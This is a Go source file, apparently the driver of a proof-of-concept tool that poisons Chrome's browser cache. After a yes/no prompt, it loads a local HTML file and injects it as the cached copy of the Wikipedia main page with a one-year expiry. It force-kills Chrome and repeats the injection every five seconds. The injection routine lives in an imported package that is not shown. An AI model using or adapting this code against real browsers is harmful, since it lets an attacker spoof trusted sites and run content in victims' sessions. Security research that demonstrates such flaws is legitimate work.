package main 

import (
	"fmt"
	"time"
	"strings"
	"runtime"
	"io/ioutil"
	"os/exec"

	"chrome-poc/injector"
)

const (
	TestHtmlFilePath = "./test-files/test.html"
)

func readFile(path string) []byte {
	fileData, err := ioutil.ReadFile(path)
	if err != nil {
		panic(err)
	}
	return fileData
}

func killProc(name string) {
	exec.Command("pkill", "-SIGKILL", name).Run()
}

func checkUserApproval() bool {
	fmt.Printf(
		"Do you want to inject code from %v into web pages in Chrome? yes/no\n", 
		TestHtmlFilePath,
	)

	var input string
 	fmt.Scanln(&input)

	return strings.ToLower(input) == "yes"
}

func main() {
	fmt.Println("Chrome POC demo")

	if runtime.GOOS == "windows" {
		fmt.Println("Windows isn't supported")
		return 
	}

	if !checkUserApproval() {
		fmt.Println("Exiting...")
		return
	}

	testContent := readFile(TestHtmlFilePath)

	chromeInjector := injector.ChromeInjector{}
	chromeInjector.ExpireDate = time.Now().Add(time.Hour * 24 * 365)
	chromeInjector.Urls = []string{
		"https://en.wikipedia.org/wiki/Main_Page",
	}
	chromeInjector.Content = testContent
	chromeInjector.ContentType = "text/html"

	/* use this to reduce the size of the generated cache file */
	// chromeInjector.GzipContent()

	killProc("Chrome")

	for {
		fmt.Println("\nInjecting cache data...")

		chromeInjector.Inject()

		time.Sleep(5 * time.Second)
	}
}